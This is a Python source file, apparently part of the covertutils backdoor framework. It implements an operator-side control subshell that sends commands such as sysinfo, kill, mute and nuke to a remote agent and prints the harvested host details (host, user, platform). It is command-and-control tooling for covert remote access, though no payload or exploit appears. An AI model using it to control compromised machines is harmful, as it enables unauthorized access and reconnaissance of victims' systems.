import json
# from covertutils.payloads.generic.control import Commands as control_commands
from covertutils.shells.subshells import SimpleSubShell

Commands = {
	'reset' : 'RST',
	'identity' : 'ID',
	'sysinfo' : 'SI',
	'kill' : 'KI',
	'mute' : 'MU',
	'unmute' : 'UM',
	'nuke' : 'NK',
	'check_sync' : 'CS',
	}


def message_handle(message, instance) :

	if instance.sysinfo :
		# sysinfo_var = message
		# sysinfo = json.loads(message)
		sysinfo = message.split('+')
		instance.message_logger.warn( """
General:
	Host: {}
	Machine: {}
	Version: {}
	Locale: {}
	Platform: {}
	Release: {}
	System: {}
	Processor: {}
	User: {}

Specifics:
	Windows: {}
	Linux: {}

		""".format( *sysinfo ) )
# 	MacOS: {}
		instance.base_shell.sysinfo = sysinfo
		instance.sysinfo = False

	elif instance.check_sync :
		my_dict = {}
		orch = instance.handler.getOrchestrator()
		for stream in orch.getStreams() :
			my_dict[stream] = orch.getKeyCycles(stream)
		remote_dict = json.loads(message)
		print "local: " + json.dumps(my_dict)
		print "remote: " + message
		instance.check_sync = False

	else :
		instance.message_logger.warn( message )


class ControlSubShell ( SimpleSubShell ) :

	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(['X']), prompt_templ = " (>{stream}<) |-> ") :
		SimpleSubShell.__init__( self, stream, handler, queue_dict, base_shell, ignore_messages, prompt_templ )
		self.updatePrompt( )
		self.message_function = message_handle
		self.sysinfo = False
		self.check_sync = False
		self.killed = False


	def default( self, line ) :

		comm, args, line = self.parseline(line)
		try :
			command = Commands[comm]
		except :
			self.debug_logger.warn( "No such control command [%s]!" % comm)
			return
		# print( "Sending '%s' command" % command )
		if command == Commands['reset'] :
			self.debug_logger.warn( "Reseting handler" )
			self.resetHandler()

		if command == Commands['sysinfo'] :
			self.sysinfo = True

		if command == Commands['kill'] :
			self.killed = True

		self.debug_logger.warn( "Sending '%s' control command!" % command )
		self.handler.preferred_send( command, self.stream )


		if command == Commands['check_sync'] :
			self.check_sync = True


	def resetHandler( self ) :
		self.handler.reset()
